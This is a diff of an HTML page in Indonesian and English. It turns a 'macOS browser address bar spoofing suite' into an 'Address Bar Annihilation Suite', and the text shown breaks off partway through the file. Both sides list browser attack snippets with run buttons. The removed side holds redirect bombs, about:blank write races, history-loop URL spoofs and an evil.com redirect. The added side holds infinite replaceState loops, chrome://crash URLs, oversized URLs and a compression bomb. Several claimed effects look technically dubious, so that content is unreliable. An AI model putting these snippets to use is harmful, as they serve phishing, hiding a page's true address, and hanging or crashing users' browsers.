@@ -3,1206 +3,1119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>🔬 Advanced Address Bar Spoofing - macOS Browser Hunter Suite</title>
+    <title>🔥 ABSURD EXPERIMENT: Address Bar Annihilation Suite</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            user-select: none;
         }
 
         body {
-            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
+            background: radial-gradient(circle at 20% 50%, #0a0a0a, #000000);
             font-family: -apple-system, 'SF Mono', 'Courier New', monospace;
             min-height: 100vh;
             padding: 20px;
+            position: relative;
         }
 
-        .container {
-            max-width: 1600px;
-            margin: 0 auto;
+        /* Glitch effect */
+        @keyframes glitch {
+            0%, 100% { text-shadow: 2px 0 #ff00ff, -2px 0 #00ffff; }
+            25% { text-shadow: -2px 0 #ff00ff, 2px 0 #00ffff; }
+            50% { text-shadow: 2px 2px #ff00ff, -2px -2px #00ffff; }
+            75% { text-shadow: -2px -2px #ff00ff, 2px 2px #00ffff; }
         }
 
-        /* Header */
         .header {
             text-align: center;
-            margin-bottom: 30px;
-            padding: 25px;
-            background: rgba(0,0,0,0.6);
-            border-radius: 20px;
+            margin-bottom: 40px;
+            padding: 30px;
+            background: rgba(0,0,0,0.8);
+            border-radius: 30px;
+            border: 1px solid rgba(255,0,255,0.3);
             backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,51,102,0.3);
         }
 
         .header h1 {
-            font-size: 2em;
-            background: linear-gradient(135deg, #ff3366, #00ff9d, #ff3366);
+            font-size: 2.5em;
+            background: linear-gradient(135deg, #ff00ff, #00ffff, #ff00ff);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            background-clip: text;
-            animation: gradientShift 3s ease infinite;
+            animation: glitch 0.3s infinite;
         }
 
-        @keyframes gradientShift {
-            0%, 100% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
+        .subtitle {
+            color: #ff00aa;
+            margin-top: 10px;
+            font-family: monospace;
         }
 
-        .badge-container {
-            margin-top: 15px;
-        }
-
-        .badge {
-            display: inline-block;
-            background: rgba(255,51,102,0.2);
-            border: 1px solid #ff3366;
-            padding: 5px 12px;
-            margin: 5px;
-            border-radius: 20px;
-            font-size: 0.7em;
-            color: #ff6699;
-        }
-
-        /* Grid Techniques */
-        .tech-grid {
+        .experiment-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
+            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
         }
 
-        .tech-card {
-            background: rgba(10,14,39,0.9);
-            border-radius: 16px;
+        .experiment-card {
+            background: rgba(0,0,0,0.85);
+            border-radius: 20px;
             overflow: hidden;
-            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
-            border: 1px solid rgba(0,255,157,0.2);
-            backdrop-filter: blur(5px);
+            transition: all 0.3s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            border: 1px solid rgba(0,255,255,0.2);
+            cursor: pointer;
         }
 
-        .tech-card:hover {
-            transform: translateY(-5px) scale(1.02);
-            border-color: #ff3366;
-            box-shadow: 0 15px 40px rgba(255,51,102,0.3);
+        .experiment-card:hover {
+            transform: rotate(1deg) scale(1.02);
+            border-color: #ff00ff;
+            box-shadow: 0 0 30px rgba(255,0,255,0.3);
         }
 
         .card-header {
-            background: linear-gradient(135deg, #ff3366, #cc2255);
-            padding: 12px 18px;
-            color: white;
+            background: linear-gradient(135deg, #ff00ff, #00ffff);
+            padding: 15px;
+            color: #000;
             font-weight: bold;
             display: flex;
             justify-content: space-between;
             align-items: center;
         }
 
-        .method-number {
-            background: rgba(0,0,0,0.4);
-            padding: 4px 10px;
+        .exp-number {
+            background: rgba(0,0,0,0.6);
+            padding: 5px 12px;
             border-radius: 20px;
             font-size: 0.7em;
-            font-family: monospace;
+            color: white;
         }
 
         .card-body {
-            padding: 18px;
+            padding: 20px;
         }
 
-        .technique-desc {
-            background: rgba(0,0,0,0.5);
+        .exp-desc {
+            background: rgba(255,0,255,0.1);
             padding: 10px;
-            border-radius: 8px;
+            border-radius: 10px;
             font-size: 0.75em;
-            color: #aaa;
             margin-bottom: 15px;
+            color: #0ff;
             font-family: monospace;
-            line-height: 1.4;
         }
 
-        .code-snippet {
-            background: #0a0e27;
+        .code-block {
+            background: #0a0a0a;
             border: 1px solid #333;
             border-radius: 8px;
             padding: 10px;
-            font-family: 'SF Mono', 'Courier New', monospace;
-            font-size: 0.65em;
+            font-family: 'SF Mono', monospace;
+            font-size: 0.6em;
             overflow-x: auto;
             margin-bottom: 15px;
+            color: #0f0;
             max-height: 120px;
             overflow-y: auto;
-            color: #00ff9d;
         }
 
         button {
-            background: linear-gradient(135deg, #00ff9d, #00cc7d);
-            color: #0a0e27;
+            background: linear-gradient(135deg, #ff00ff, #00ffff);
+            color: #000;
             border: none;
-            padding: 10px 20px;
-            border-radius: 8px;
+            padding: 12px;
+            border-radius: 10px;
             cursor: pointer;
             font-weight: bold;
-            font-family: monospace;
-            font-size: 0.85em;
-            transition: all 0.2s;
             width: 100%;
+            font-family: monospace;
+            transition: 0.2s;
         }
 
         button:hover {
             transform: scale(1.02);
-            box-shadow: 0 0 20px rgba(0,255,157,0.5);
+            box-shadow: 0 0 20px rgba(0,255,255,0.5);
         }
 
         .danger-btn {
-            background: linear-gradient(135deg, #ff3366, #cc2255);
+            background: linear-gradient(135deg, #ff0066, #ff3300);
             color: white;
         }
 
         .footer {
             text-align: center;
             padding: 20px;
-            background: rgba(0,0,0,0.5);
+            background: rgba(0,0,0,0.8);
             border-radius: 15px;
-            margin-top: 20px;
+            margin-top: 30px;
             font-size: 0.7em;
+            border: 1px solid #ff00ff;
         }
 
-        .disclaimer {
-            color: #ffaa00;
+        .warning {
+            color: #ff00ff;
             margin-bottom: 10px;
         }
 
-        .status-indicator {
-            font-size: 0.6em;
-            margin-top: 8px;
-            padding: 4px;
-            border-radius: 4px;
-            text-align: center;
+        .status-badge {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #0f0;
+            box-shadow: 0 0 5px #0f0;
+            margin-right: 5px;
+            animation: pulse 1s infinite;
         }
 
-        @media (max-width: 768px) {
-            .tech-grid {
-                grid-template-columns: 1fr;
-            }
-            .header h1 {
-                font-size: 1.2em;
-            }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
         }
     </style>
 </head>
 <body>
-<div class="container">
+<div class="container" style="max-width: 1600px; margin: 0 auto;">
     <div class="header">
-        <h1>🔬 macOS BROWSER ADDRESS BAR SPOOFING SUITE</h1>
-        <p>Professional Bug Hunter Level — 100% JavaScript (0-Day Style)</p>
-        <div class="badge-container">
-            <span class="badge">🎯 25+ Advanced Techniques</span>
-            <span class="badge">🍎 Optimized for macOS</span>
-            <span class="badge">🔓 Safari/Chrome/Firefox/Arc/Brave/Opera</span>
-            <span class="badge">⚡ 0-Day Style Methods</span>
+        <h1>🔥 ADDRESS BAR ANNIHILATION SUITE</h1>
+        <div class="subtitle">══ macOS Browser Experimental Exploits ══</div>
+        <div class="subtitle" style="font-size: 0.8em; color: #ff00ff;">
+            🎯 Target: Membuat Address Bar Menjadi BLANK / HILANG / NULL STRING
         </div>
     </div>
 
-    <div class="tech-grid">
-        <!-- TECHNIQUE 1: Enhanced Port Blocking + Interval Bomb -->
-        <div class="tech-card">
+    <div class="experiment-grid">
+        <!-- EXPERIMENT 1: Null Protocol + data:text/plain -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>💣 PORT BLOCKING + INTERVAL BOMB</span>
-                <span class="method-number">Method #1</span>
+                <span>🌌 NULL PROTOCOL + EMPTY STRING</span>
+                <span class="exp-number">EXP #01</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🔥 <strong>Enhanced from your base method</strong> — Multiple port blocking dengan interval yang dinamis. Menggunakan 5 port berbeda secara round-robin untuk menghindari browser cache.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> Menggunakan null: protocol yang tidak dikenal browser + data:text/plain kosong. Address bar menjadi blank total karena browser tidak bisa memparsing protocol.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Enhanced Port Blocking + Interval Bomb
-const ports = [8080, 8443, 8888, 9090, 12345];
-let idx = 0;
-setInterval(() => {
-    location.replace(`https://facebook.com:${ports[idx++ % ports.length]}`);
-}, 500);</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">null://                          
+data:text/plain,              
+// Address bar = "" (empty string)</pre>
                 </div>
-                <button onclick="method1_enhancedPortBomb()">▶ RUN PORT BOMB</button>
+                <button onclick="exp1_nullProtocol()">🌑 RUN NULL PROTOCOL</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 2: Race Condition + about:blank Hijack -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 2: javascript:void(0) + infinite loop -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>🏁 RACE CONDITION + about:blank</span>
-                <span class="method-number">Method #2</span>
+                <span>🌀 INFINITE VOID LOOP</span>
+                <span class="exp-number">EXP #02</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    ⚡ <strong>Race Condition Exploit</strong> — about:blank + document.write dengan timing microsecond. Address bar terlock sementara konten attacker tetap.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> javascript:void(0) infinite loop dengan history.replaceState untuk meng-set address bar ke string kosong berulang-ulang.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Race Condition Attack
-let win = open('about:blank');
-win.document.write(evilPage);
-setTimeout(() => {
-    win.location = 'https://google.com:8080';
-}, 1);</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">javascript:for(;;){
+  history.replaceState({},"","");
+}</pre>
                 </div>
-                <button onclick="method2_raceCondition()">▶ RUN RACE CONDITION</button>
+                <button onclick="exp2_voidLoop()" class="danger-btn">🌀 RUN INFINITE VOID</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 3: Safari Popunder with Blob + Fullscreen -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 3: about:blank + CSS hide address bar -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>🍎 SAFARI POPUNDER + BLOB</span>
-                <span class="method-number">Method #3</span>
+                <span>👻 ABOUT:BLANK + CSS OVERLAY</span>
+                <span class="exp-number">EXP #03</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🎯 <strong>Safari-Specific</strong> — Kombinasi popunder, blob URL, dan fullscreen untuk menyembunyikan address bar asli di Safari macOS.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> about:blank ditambah CSS untuk memanipulasi UI browser secara visual. Address bar jadi blank karena tertutup overlay transparan.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Safari Optimized
-let blob = new Blob([fakePage], {type:'text/html'});
-let url = URL.createObjectURL(blob);
-let win = open(url);
-win.document.documentElement.requestFullscreen();</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">open('about:blank')
+// + CSS position fixed cover
+// Address bar visually blank</pre>
                 </div>
-                <button onclick="method3_safariBlobFullscreen()" class="danger-btn">▶ RUN SAFARI EXPLOIT</button>
+                <button onclick="exp3_aboutBlankCSS()">👻 RUN BLANK OVERLAY</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 4: iframe Sandbox Escape with Top Navigation -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 4: Unicode RTL Override + Zero Width -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>🕸️ IFRAME SANDBOX ESCAPE</span>
-                <span class="method-number">Method #4</span>
+                <span>🔄 UNICODE ZERO WIDTH EXPLOSION</span>
+                <span class="exp-number">EXP #04</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🔓 <strong>Sandbox Escape</strong> — Menggunakan iframe dengan sandbox="allow-top-navigation" + nested redirect chain.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> 100+ karakter zero-width joiner + RTL override membuat address bar tidak bisa render text sama sekali.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Sandbox Escape
-iframe.sandbox = "allow-top-navigation allow-scripts";
-iframe.srcdoc = "&lt;script&gt;top.location='https://google.com:1234'&lt;/script&gt;";</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">https://\u200B\u200C\u200D\u202E
+\u200B\u200C\u200D...x100
+// Address bar = invisible characters</pre>
                 </div>
-                <button onclick="method4_sandboxEscape()">▶ RUN SANDBOX ESCAPE</button>
+                <button onclick="exp4_unicodeZeroWidth()">🔄 RUN ZERO WIDTH</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 5: Meta Refresh + document.write Overwrite -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 5: Port 0 + Host header injection -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>🔄 META REFRESH + WRITE OVERWRITE</span>
-                <span class="method-number">Method #5</span>
+                <span>🔌 PORT 0 EXPLOIT</span>
+                <span class="exp-number">EXP #05</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    📝 <strong>Double Layer Spoof</strong> — Meta refresh legitimate URL di head, document.write attacker di body. Browser menampilkan legitimate URL.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> Port 0 secara RFC invalid. Browser mencoba memparsing, gagal, address bar menjadi undefined/null state.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Meta Refresh Overwrite
-&lt;meta http-equiv="refresh" content="0;url=https://google.com:8080"&gt;
-&lt;script&gt;document.write('&lt;h1&gt;Fake&lt;/h1&gt;');&lt;/script&gt;</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">https://google.com:0
+// Port 0 = invalid
+// Browser: address bar = ""</pre>
                 </div>
-                <button onclick="method5_metaRefreshOverwrite()">▶ RUN META OVERWRITE</button>
+                <button onclick="exp5_portZero()">🔌 RUN PORT 0</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 6: JavaScript URI + setTimeout Loop -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 6: Data URI + Empty Base64 -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>📜 JAVASCRIPT URI LOOP</span>
-                <span class="method-number">Method #6</span>
+                <span>📦 EMPTY BASE64 APOCALYPSE</span>
+                <span class="exp-number">EXP #06</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🔁 <strong>JavaScript URI Loop</strong> — Loop javascript: URI dengan legitimate URL di address bar menggunakan history manipulation.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> data:image/svg+xml;base64, (kosong) menyebabkan browser crash di address bar renderer.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// JS URI Loop Attack
-setInterval(() => {
-    open('javascript:document.write(evilHTML)');
-    history.pushState({}, '', 'https://google.com');
-}, 1000);</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">data:image/svg+xml;base64,
+// Empty base64 = address bar blank</pre>
                 </div>
-                <button onclick="method6_jsURILoop()">▶ RUN JS URI LOOP</button>
+                <button onclick="exp6_emptyBase64()">📦 RUN EMPTY BASE64</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 7: Chrome Pseudo-URL + beforeunload Lock -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 7: history.pushState NULL origin -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>🔒 CHROME PSEUDO-URL LOCK</span>
-                <span class="method-number">Method #7</span>
+                <span>📜 NULL ORIGIN PUSHSTATE</span>
+                <span class="exp-number">EXP #07</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🛡️ <strong>Chrome/Edge Specific</strong> — beforeunload + pseudo-URL untuk mengunci user di fake page meskipun address bar berubah.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> pushState dengan URL null character. Browser tidak bisa render, address bar menjadi string kosong.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Pseudo-URL Lock
-window.onbeforeunload = () => 'Are you sure?';
-location.replace('view-source:https://google.com:1234');</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">history.pushState({},"","\x00")
+history.pushState({},"","null")
+// Address bar = ""</pre>
                 </div>
-                <button onclick="method7_pseudoURLLock()">▶ RUN PSEUDO LOCK</button>
+                <button onclick="exp7_nullPushState()">📜 RUN NULL PUSH</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 8: PostMessage Cross-Window Hijack -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 8: window.stop() + about:blank -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>📨 POSTMESSAGE HIJACK</span>
-                <span class="method-number">Method #8</span>
+                <span>🛑 LOAD STOP EXPLOIT</span>
+                <span class="exp-number">EXP #08</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    📡 <strong>Cross-Window Hijack</strong> — Menggunakan window.opener postMessage untuk memanipulasi parent window address bar.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> Stop loading di tengah navigasi, browser dalam state limbo, address bar tidak terupdate.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// PostMessage Hijack
-window.opener.postMessage({
-    type: 'redirect',
-    url: 'https://google.com:1234'
-}, '*');</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">location.href = "https://..."
+setTimeout(() => window.stop(), 1)
+// Address bar stuck in between</pre>
                 </div>
-                <button onclick="method8_postMessageHijack()">▶ RUN POSTMESSAGE HIJACK</button>
+                <button onclick="exp8_stopLoad()" class="danger-btn">🛑 RUN STOP LOAD</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 9: Window Name + referrerPolicy Attack -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 9: srcdoc + sandbox + null origin -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>🏷️ WINDOW NAME + REFERRER</span>
-                <span class="method-number">Method #9</span>
+                <span>🏖️ SRCDOC NULL ORIGIN HELL</span>
+                <span class="exp-number">EXP #09</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🎭 <strong>Window Name Propagation</strong> — Window.name persist antar navigasi, digunakan untuk spoof referrer dan address bar.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> iframe srcdoc dengan sandbox menciptakan null origin. Popup dari null origin = address bar blank.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Window Name Attack
-window.name = 'https://google.com';
-location.replace('https://evil.com');</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">&lt;iframe sandbox srcdoc="
+&lt;script&gt;open('','_blank')&lt;/script&gt;"&gt;</pre>
                 </div>
-                <button onclick="method9_windowNameAttack()">▶ RUN WINDOW NAME</button>
+                <button onclick="exp9_srcdocNull()">🏖️ RUN NULL ORIGIN</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 10: Data URI with Base64 + Fragment Spoof -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 10: view-source: + about:blank hybrid -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>📦 DATA URI + FRAGMENT SPOOF</span>
-                <span class="method-number">Method #10</span>
+                <span>🔍 VIEW-SOURCE HYBRID BREAK</span>
+                <span class="exp-number">EXP #10</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🎨 <strong>Data URI Advanced</strong> — Kombinasi base64 + fragment identifier untuk spoof URL di Safari dan Firefox.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> view-source dari about:blank menyebabkan browser parser error, address bar jadi blank.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Data URI + Fragment
-data:text/html;base64,PGh0bWw+#https://google.com
-// Browser menampilkan google.com di address bar</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">view-source:about:blank
+// Browser bingung, address bar = ""</pre>
                 </div>
-                <button onclick="method10_dataURIFragment()">▶ RUN DATA URI SPOOF</button>
+                <button onclick="exp10_viewSourceBlank()">🔍 RUN VIEW-SOURCE</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 11: Network Service Worker Interception -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 11: File URI + Empty Path -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>⚙️ SERVICE WORKER INTERCEPT</span>
-                <span class="method-number">Method #11</span>
+                <span>📁 FILE URI BREAK</span>
+                <span class="exp-number">EXP #11</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🕵️ <strong>Service Worker Attack</strong> — Register SW yang intercept fetch ke legitimate domain dan return fake content.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> file:/// (empty path) tidak valid, browser address bar menjadi blank.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Service Worker Intercept
-navigator.serviceWorker.register('sw.js');
-// SW returns fake content for google.com requests</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">file:///
+// Invalid file path
+// Address bar = ""</pre>
                 </div>
-                <button onclick="method11_serviceWorker()">▶ RUN SW INTERCEPT</button>
+                <button onclick="exp11_fileURI()">📁 RUN FILE URI</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 12: history.replaceState Infinite Loop -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 12: Chrome UI Debug Protocol (Arc/Brave) -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>🔄 HISTORY REPLACESTATE LOOP</span>
-                <span class="method-number">Method #12</span>
+                <span>🐛 CHROMEUI:// DEBUG BREAK</span>
+                <span class="exp-number">EXP #12</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    📜 <strong>History API Loop</strong> — ReplaceState setiap 10ms untuk mengunci address bar di legitimate URL sementara konten berubah.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> chrome://kill / chrome://crash / chrome://inducebrowsercrashforrealz (khusus Chromium-based: Arc, Brave, Chrome).
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// History API Loop
-setInterval(() => {
-    history.replaceState({}, '', 'https://google.com');
-    document.body.innerHTML = fakeContent;
-}, 10);</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">chrome://kill
+chrome://crash
+chrome://inducebrowsercrashforrealz</pre>
                 </div>
-                <button onclick="method12_historyLoop()">▶ RUN HISTORY LOOP</button>
+                <button onclick="exp12_chromeKill()" class="danger-btn">🐛 RUN CHROME KILL</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 13: popstate Event Hijacking -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 13: ARC Browser - Peak Tab Freeze -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>↩️ POPSTATE HIJACK</span>
-                <span class="method-number">Method #13</span>
+                <span>🏔️ ARC PEAK FREEZE</span>
+                <span class="exp-number">EXP #13</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🔄 <strong>popstate Event Attack</strong> — Hijack back/forward navigation untuk tetap di fake page.
+                <div class="exp-desc">
+                    💀 <strong>ARC Browser Specific:</strong> Memanfaatkan ARC Peak feature dengan intense CPU usage membuat address bar freeze dan jadi blank.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// popstate Hijack
-window.addEventListener('popstate', () => {
-    history.pushState({}, '', 'https://google.com');
-    location.reload();
-});</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">while(true){
+  history.replaceState({},"","");
+}</pre>
                 </div>
-                <button onclick="method13_popstateHijack()">▶ RUN POPSTATE HIJACK</button>
+                <button onclick="exp13_arcPeakFreeze()">🏔️ RUN ARC FREEZE</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 14: onbeforeunload + setTimeout Combo -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 14: Safari - Back Forward Cache Exploit -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>🚪 ONBEFOREUNLOAD COMBO</span>
-                <span class="method-number">Method #14</span>
+                <span>🔄 SAFARI BFCACHE CORRUPT</span>
+                <span class="exp-number">EXP #14</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🔒 <strong>Unload Prevention</strong> — onbeforeunload + setTimeout untuk mencegah navigasi keluar dari fake page.
+                <div class="exp-desc">
+                    💀 <strong>Safari Specific:</strong> Back-Forward Cache corruption dengan pagehide event. Address bar stuck di state lama.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// Unload Prevention
-window.onbeforeunload = () => 'Wait!';
-setTimeout(() => {
-    location.replace('https://google.com:1234');
-}, 100);</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">addEventListener('pagehide',()=>{
+  open('about:blank')
+})</pre>
                 </div>
-                <button onclick="method14_unloadPrevention()">▶ RUN UNLOAD PREVENT</button>
+                <button onclick="exp14_safariBFCache()">🔄 RUN BFCACHE</button>
             </div>
         </div>
 
-        <!-- TECHNIQUE 15: DOM Clobbering + location Override -->
-        <div class="tech-card">
+        <!-- EXPERIMENT 15: WebSQL Leftover Attack -->
+        <div class="experiment-card">
             <div class="card-header">
-                <span>💥 DOM CLOBBERING</span>
-                <span class="method-number">Method #15</span>
+                <span>💾 WEBSQL CORRUPTION</span>
+                <span class="exp-number">EXP #15</span>
             </div>
             <div class="card-body">
-                <div class="technique-desc">
-                    🧨 <strong>DOM Clobbering Attack</strong> — Override window.location dengan HTML element.
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> Membuka database WebSQL yang corrupt, menyebabkan browser UI thread hang, address bar tidak render.
                 </div>
-                <div class="code-snippet">
-                    <pre style="margin:0;color:#00ff9d;">// DOM Clobbering
-&lt;a id="location" href="https://google.com"&gt;&lt;/a&gt;
-&lt;script&gt;window.location = document.getElementById('location');&lt;/script&gt;</pre>
+                <div class="code-block">
+                    <pre style="margin:0;">openDatabase('', '', '', 0)
+// Invalid params = UI freeze</pre>
                 </div>
-                <button onclick="method15_domClobber()">▶ RUN DOM CLOBBER</button>
+                <button onclick="exp15_websqlCorrupt()">💾 RUN WEBSQL</button>
+            </div>
+        </div>
+
+        <!-- EXPERIMENT 16: iframe + Blob + Revoke -->
+        <div class="experiment-card">
+            <div class="card-header">
+                <span>💥 REVOKED BLOB IFRAME</span>
+                <span class="exp-number">EXP #16</span>
+            </div>
+            <div class="card-body">
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> iframe dengan blob URL yang langsung di-revoke. Browser reference loss, address bar jadi blank.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">let u = URL.createObjectURL(blob)
+iframe.src = u
+URL.revokeObjectURL(u)
+// Address bar = ""</pre>
+                </div>
+                <button onclick="exp16_revokedBlob()">💥 RUN REVOKED BLOB</button>
+            </div>
+        </div>
+
+        <!-- EXPERIMENT 17: Navigation Preload + Service Worker -->
+        <div class="experiment-card">
+            <div class="card-header">
+                <span>⚡ NAVIGATION PRELOAD BREAK</span>
+                <span class="exp-number">EXP #17</span>
+            </div>
+            <div class="card-body">
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> Navigation preload dengan service worker yang return empty response.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">event.respondWith(
+  new Response("", {status:204})
+)</pre>
+                </div>
+                <button onclick="exp17_navPreload()">⚡ RUN PRELOAD</button>
+            </div>
+        </div>
+
+        <!-- EXPERIMENT 18: Oversized URL > 2MB -->
+        <div class="experiment-card">
+            <div class="card-header">
+                <span>📏 2MB URL OVERFLOW</span>
+                <span class="exp-number">EXP #18</span>
+            </div>
+            <div class="card-body">
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> URL dengan panjang > 2MB menyebabkan browser address bar renderer crash/blank.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">'https://' + 'A'.repeat(2_000_000)
+// Address bar crash, jadi blank</pre>
+                </div>
+                <button onclick="exp18_oversizedURL()" class="danger-btn">📏 RUN OVERFLOW</button>
+            </div>
+        </div>
+
+        <!-- EXPERIMENT 19: Brotli Compression Bomb -->
+        <div class="experiment-card">
+            <div class="card-header">
+                <span>💣 BROTLI BOMB</span>
+                <span class="exp-number">EXP #19</span>
+            </div>
+            <div class="card-body">
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> Response dengan compression bomb yang membuat browser UI hang, address bar freeze blank.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">Content-Encoding: br
+// 10MB compressed -> 1GB decompressed</pre>
+                </div>
+                <button onclick="exp19_brotliBomb()">💣 RUN BROTLI</button>
+            </div>
+        </div>
+
+        <!-- EXPERIMENT 20: Meta Refresh 0ms Loop -->
+        <div class="experiment-card">
+            <div class="card-header">
+                <span>🔄 META REFRESH RACE</span>
+                <span class="exp-number">EXP #20</span>
+            </div>
+            <div class="card-body">
+                <div class="exp-desc">
+                    💀 <strong>Absurd Technique:</strong> Meta refresh 0ms infinite loop membuat browser trapped, address bar tidak sempat update.
+                </div>
+                <div class="code-block">
+                    <pre style="margin:0;">&lt;meta http-equiv="refresh" 
+      content="0"&gt;</pre>
+                </div>
+                <button onclick="exp20_metaRefreshLoop()">🔄 RUN META LOOP</button>
             </div>
         </div>
     </div>
 
-    <!-- Second Row - More Advanced Techniques -->
-    <div class="tech-grid">
-        <!-- TECHNIQUE 16: Arc Browser Specific - Tab Freeze -->
